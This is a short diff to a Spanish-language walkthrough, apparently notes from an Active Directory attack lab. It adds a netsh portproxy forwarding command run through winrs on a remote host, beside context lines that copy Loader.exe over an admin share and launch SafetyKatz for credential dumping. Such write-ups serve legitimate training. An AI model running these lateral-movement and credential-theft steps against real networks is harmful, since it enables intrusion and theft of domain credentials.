@@ -702,6 +702,12 @@ Primero tendremos que hacer un exit de la *PowerShell*
 echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
 ```
 
+Despues deberemos de ejecutar un reenvio de puertos
+```shell
+[newShell as srvadmin privileges - CMD]
+winrs -r:dcorp-mgmt netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.97
+```
+
 Una vez copiado el *Loader* ejecutaremos *SafetyKatz* a traves de *winrs*
 ```shell
 [newShell as srvadmin privileges - CMD]
